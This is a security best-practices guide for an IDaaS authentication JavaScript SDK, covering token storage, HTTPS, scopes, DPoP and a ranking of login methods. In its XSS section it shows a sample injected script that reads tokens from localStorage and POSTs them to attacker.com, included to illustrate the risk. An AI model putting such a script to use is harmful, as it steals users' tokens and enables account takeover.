# Security Best Practices

This guide covers security considerations specific to using the IDaaS Auth JavaScript SDK, focusing on the SDK's built-in protections, configuration choices, and secure usage patterns.

> **🔒 Security Responsibility:** The SDK handles PKCE, token validation, and secure token storage, but your application must prevent XSS vulnerabilities and handle credentials securely.

## Table of Contents

- [What the SDK Protects Against](#what-the-sdk-protects-against)
- [Token Storage Security](#token-storage-security)
- [SDK Configuration Security](#sdk-configuration-security)
- [DPoP Protected Resources](#dpop-protected-resources)
- [Secure Credential Handling](#secure-credential-handling)
- [Authentication Method Security](#authentication-method-security)
- [Security Checklist](#security-checklist)
- [Resources](#resources)

## What the SDK Protects Against

The SDK implements OAuth 2.0 and OIDC security best practices automatically:

| Threat                              | SDK Protection                                            |
| ----------------------------------- | --------------------------------------------------------- |
| **Authorization code interception** | PKCE (S256) with cryptographically secure random verifier |
| **Token forgery**                   | JWT signature validation using IDaaS JWKS                 |
| **CSRF attacks**                    | State parameter generation and validation                 |
| **Replay attacks**                  | Nonce in ID tokens, single-use authorization codes        |
| **Session JWT theft**               | Short-lived tokens (~5 min), PKCE binding to client       |

### What You Must Protect Against

The SDK cannot prevent:

- **XSS vulnerabilities** → Can steal tokens from localStorage
- **Credential exposure** → Hardcoded passwords, logging sensitive data
- **Application-level attacks** → Your app must implement XSS/CSRF protection

See [OWASP SPA Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Single_Page_Application_Security_Cheat_Sheet.html) for comprehensive application security guidance.

## Token Storage Security

### Storage Options

The SDK provides two storage modes with different security tradeoffs:

| Storage Type       | Persistence                    | XSS Risk    | When to Use                                     |
| ------------------ | ------------------------------ | ----------- | ----------------------------------------------- |
| **`memory`**       | Session only (lost on refresh) | ✅ Low      | High-security applications, short sessions      |
| **`localstorage`** | Across sessions and tabs       | ⚠️ **High** | General applications with XSS protections (CSP) |

**Configuration:**

```typescript
const client = new IdaasClient({
  issuerUrl: "https://your-tenant.trustedauth.com",
  clientId: "your-client-id",
  storageType: "memory" // or "localstorage"
});
```

### XSS Vulnerability Impact

If your application has an XSS vulnerability and tokens are stored in localStorage, an attacker can:

```javascript
// Attacker's injected script
const tokens = {
  access: localStorage.getItem("access_token"),
  refresh: localStorage.getItem("refresh_token"),
  id: localStorage.getItem("id_token")
};
fetch("https://attacker.com/steal", {
  method: "POST",
  body: JSON.stringify(tokens)
});
```

### Recommendations

1. **Use `memory` storage** for applications handling sensitive data
2. **If using `localstorage`**:
   - Implement Content Security Policy (CSP) headers
   - Sanitize all user input
   - Use framework security features (React/Vue/Angular auto-escaping)
   - Regular security audits
3. **Never store tokens in**:
   - URL parameters (visible in logs/history)
   - Cookies without httpOnly flag
   - Custom browser storage mechanisms

## SDK Configuration Security

### HTTPS Enforcement

The SDK requires HTTPS for all communication:

```typescript
// ✅ HTTPS required (except localhost for development)
const client = new IdaasClient({
  issuerUrl: "https://your-tenant.trustedauth.com",
  clientId: "your-client-id"
});

// ❌ HTTP not supported in production
// issuerUrl: "http://your-tenant.trustedauth.com" // Will fail
```

### Scope and Audience

Use minimal scopes (principle of least privilege):

```typescript
// ❌ BAD - Request everything
const client = new IdaasClient({...}, {
  scope: "openid profile email address phone offline_access"
});

// ✅ GOOD - Request only what you need
const client = new IdaasClient({...}, {
  scope: "openid profile", // Minimal for authentication
  audience: "https://api.yourapp.com" // Binds tokens to your API
});
```

**Audience parameter**:

- Prevents token misuse across different resource servers
- Your API must validate the `aud` claim matches

### Refresh Token Configuration

```typescript
const client = new IdaasClient({...}, {
  useRefreshToken: true // Enables long-lived sessions
});
```

**Security consideration**: Refresh tokens are long-lived bearer tokens. If stolen (e.g., via XSS from localStorage), an attacker gains persistent access until token expires or is revoked.

**Recommendations**:

- Enable refresh token rotation (SDK handles automatically)
- Implement logout that revokes tokens server-side
- Consider shorter refresh token lifetime for high-security apps

## DPoP Protected Resources

DPoP binds an access token to browser-held key material. This reduces replay risk if an access token is copied out of the browser, because the token must be presented with a fresh signed proof from the matching private key.

```typescript
const accessToken = await client.getAccessToken({
  audience: "https://api.yourapp.com",
  scope: "accounts:read",
  dpop: { alg: "ES256" }
});

if (!accessToken) {
  throw new Error("No access token available");
}

const headers = await client.getDpopHeaders({
  method: "GET",
  uri: "https://api.yourapp.com/accounts",
  accessToken
});
```

Security considerations:

- `getDpopHeaders()` creates client-side request headers only. Your protected resource must validate the access token and DPoP proof.
- The resource server must compare the access token `cnf.jkt` claim to the thumbprint of the DPoP proof public key.
- The SDK keeps private key material non-extractable and does not expose low-level DPoP signing primitives.
- DPoP does not make XSS harmless. Attacker-controlled JavaScript may still call SDK methods while a session is active.
- Use `https` for protected resource requests in production.

See [DPoP Protected Resource Requests](./dpop.md) for the full usage and verification checklist.

## Authentication Method Security

The SDK supports multiple authentication methods with different security characteristics:

### Security Ranking (Strongest to Weakest)

1. **Passkey (FIDO2/WebAuthn)** ⭐⭐⭐⭐⭐

   ```typescript
   await client.auth.passkey(userId);
   ```

   - Phishing-resistant (cryptographic proof of origin)
   - Device-bound credentials
   - Biometric or security key required

2. **Hardware Token (TOKENCR)** ⭐⭐⭐⭐
   - Physical hardware device required
   - Challenge-response authentication
   - Offline operation
   - Highest security for traditional tokens
   - Resistant to remote attacks

3. **Face Biometric** ⭐⭐⭐⭐

   ```typescript
   await client.auth.faceBiometric(userId);
   ```

   - Liveness detection prevents spoofing
   - Device-bound enrollment
   - Optional mutual challenge for enhanced security
   - Requires onfido-sdk-ui peer dependency

4. **Authenticator App (TOTP)** ⭐⭐⭐⭐

   ```typescript
   await client.auth.softToken(userId);
   ```

   - Time-based codes
   - Offline generation
   - Resistant to interception

5. **Smart Credential Push** ⭐⭐⭐

   ```typescript
   await client.auth.smartCredential(userId);
   ```

   - Push notification to mobile device
   - User approval required
   - Can include transaction details
   - Vulnerable to push fatigue without mutual challenge

6. **Push Notification (TOKENPUSH)** ⭐⭐⭐

   ```typescript
   // Without mutual challenge (vulnerable to push fatigue)
   await client.auth.softToken(userId, { push: true });

   // With mutual challenge (recommended - protects against push bombing)
   await client.auth.softToken(userId, { push: true, mutualChallenge: true });
   ```

   - User approval on mobile device
   - **Mutual challenge recommended** to prevent push fatigue attacks
   - Requires network connectivity

7. **Grid Card** ⭐⭐⭐

   ```typescript
   await client.auth.grid(userId);
   ```

   - Physical card with grid of codes
   - Challenge-response based
   - Can be lost or stolen

8. **Knowledge-Based Authentication (KBA)** ⭐⭐⭐

   ```typescript
   await client.auth.kba(userId);
   ```

   - Security questions based on personal information
   - Resistant to technical attacks
   - Vulnerable to social engineering
   - Answers may be discoverable online

9. **Temporary Access Code** ⭐⭐⭐

   ```typescript
   await client.auth.tempAccessCode(userId, code);
   ```

   - Single-use codes
   - Typically delivered via secure channel
   - Time-limited validity
   - Can be intercepted during delivery

10. **SMS OTP** ⭐⭐

    ```typescript
    await client.auth.otp(userId, { otpDeliveryType: "SMS" });
    ```

    - Vulnerable to SIM swapping
    - SMS interception possible
    - Use only if stronger methods unavailable

11. **WhatsApp OTP** ⭐⭐

    ```typescript
    await client.auth.otp(userId, { otpDeliveryType: "WHATSAPP" });
    ```

    - More secure than SMS (end-to-end encrypted)
    - Still vulnerable to device compromise
    - Requires WhatsApp account

12. **WeChat OTP** ⭐⭐

    ```typescript
    await client.auth.otp(userId, { otpDeliveryType: "WECHAT" });
    ```

    - More secure than SMS (end-to-end encrypted)
    - Still vulnerable to device compromise
    - Requires WeChat account

13. **Email OTP** ⭐⭐

    ```typescript
    await client.auth.otp(userId, { otpDeliveryType: "EMAIL" });
    ```

    - Weakest MFA option
    - Email account may be compromised
    - No device separation
    - Heavily reliant on email security

14. **Magic Link** ⭐⭐

    ```typescript
    await client.auth.magicLink(userId);
    ```

    - Email-based passwordless authentication
    - Shares same vulnerabilities as email OTP
    - Vulnerable to email account compromise
    - Link can be intercepted or forwarded
    - Heavily reliant on email security

15. **Password** ⭐

    ```typescript
    await client.auth.password(userId, password);
    ```

    - Weakest authentication method
    - Vulnerable to phishing, credential stuffing, brute force
    - Often reused across services
    - Can be compromised through data breaches
    - Should always be combined with MFA

### MFA Recommendations

```typescript
// ✅ BEST - Passkey for primary, authenticator app as fallback
await client.auth.passkey(userId).catch(() => {
  return client.auth.softToken(userId);
});

// ✅ GOOD - Push authentication with mutual challenge (prevents push bombing)
await client.auth.softToken(userId, { push: true, mutualChallenge: true });

// ⚠️ ACCEPTABLE - Password + second factor with push and mutual challenge
await client.rba.requestChallenge({
  userId,
  password,
  preferredAuthenticationMethod: "PASSWORD_AND_SECONDFACTOR",
  softTokenPushOptions: { mutualChallenge: true }
});

// ⚠️ CAUTION - Push without mutual challenge (vulnerable to push fatigue attacks)
await client.auth.softToken(userId, { push: true });

// ❌ AVOID - Password only (no MFA)
await client.auth.password(userId, password);
```

## Resources

### SDK Documentation

- [JWT IDaaS Grant Type Security](./jwt-idaas-grant.md#security-considerations) - Detailed security for in-app auth
- [DPoP Protected Resource Requests](./dpop.md) - DPoP usage and resource server verification requirements
- [OIDC Guide](./oidc.md) - Hosted authentication flow
- [RBA Guide](./rba.md) - Self-hosted authentication
- [Troubleshooting](../troubleshooting.md)

### Standards and Best Practices

- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
- [OAuth 2.0 for Browser-Based Apps](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps)
- [PKCE RFC 7636](https://datatracker.ietf.org/doc/html/rfc7636)
- [OpenID Connect Core](https://openid.net/specs/openid-connect-core-1_0.html)

### Application Security

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Common web vulnerabilities
- [OWASP SPA Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Single_Page_Application_Security_Cheat_Sheet.html)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)

### Vulnerability Reporting

If you discover a security vulnerability in the SDK, please follow our [Security Policy](../../SECURITY.md) for responsible disclosure.

---

**Remember**: The SDK provides secure building blocks, but overall application security is your responsibility. Implement defense-in-depth with multiple security layers.
